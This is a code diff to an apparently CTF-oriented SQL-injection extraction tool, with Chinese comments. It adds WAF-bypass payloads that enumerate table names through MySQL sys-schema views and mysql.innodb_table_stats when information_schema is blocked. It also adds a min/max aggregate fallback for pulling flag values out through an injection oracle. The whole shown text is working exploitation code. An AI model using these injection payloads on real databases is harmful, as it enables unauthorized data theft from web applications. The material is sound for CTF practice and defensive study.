@@ -177,7 +177,27 @@ class ExtractionPipeline:
                 return [x for x in raw.split(",") if x] if raw else []
             return self._slow_list("name", where)
         if self.waf.is_filtered("information_schema"):
-            # information_schema 含 or 子串等被拦 → 常用表名存在性爆破兜底
+            # information_schema 被拦时的替代视图（ctf2 #186 GYCTF 实测：
+            # sys.x$schema_flattened_keys 可用）；再失败才走字典爆破
+            for expr in (
+                f"(select(group_concat(table_name))from(sys.x$schema_flattened_keys)"
+                f"where(table_schema=database()))",
+                f"(select(group_concat(table_name))"
+                f"from(sys.schema_table_statistics_with_buffer)"
+                f"where(table_schema=database()))",
+                f"(select(group_concat(name))from(mysql.innodb_table_stats)"
+                f"where(database_name=database()))",
+            ):
+                try:
+                    raw = self.o.scalar(expr)
+                except OracleError:
+                    continue
+                names = [t for t in (raw or "").split(",") if t]
+                if names:
+                    self._note("sys 库枚举表名（information_schema 被拦）",
+                               f"{db} 的表: {names}")
+                    return names
+            # 全部替代视图失败 → 常用表名存在性爆破兜底
             fmt = f"(select(0)from({db}.{{w}}))" if db else "(select(0)from({w}))"
             tables = self._brute("表", fmt, _brute_dict().get("tables", []))
             if tables:
@@ -435,6 +455,26 @@ class ExtractionPipeline:
                         cols = [c]
                         self._note("表名提示直读标量",
                                    f"{res.database}.{hint}.{c} = {val[:40]}")
+                        break
+            if not rows:
+                # 兜底：min/max 聚合（表里大量占位值 xxx 时 group_concat 会
+                # 被占位淹没，聚合能直接取到真 flag；ctf2 #173 RCTF 实测）
+                for c in cols:
+                    for agg in ("min", "max"):
+                        if self.s.stopped:
+                            break
+                        try:
+                            val = self.o.scalar(
+                                f"(select({agg}({c}))from({hint}))")
+                        except OracleError:
+                            continue
+                        if val and FLAGISH.search(val):
+                            rows = [{c: val}]
+                            cols = [c]
+                            self._note("min/max 聚合取值",
+                                       f"{hint}.{c} {agg} = {val[:40]}")
+                            break
+                    if rows:
                         break
             if rows:
                 res.tables[res.database] = [hint]
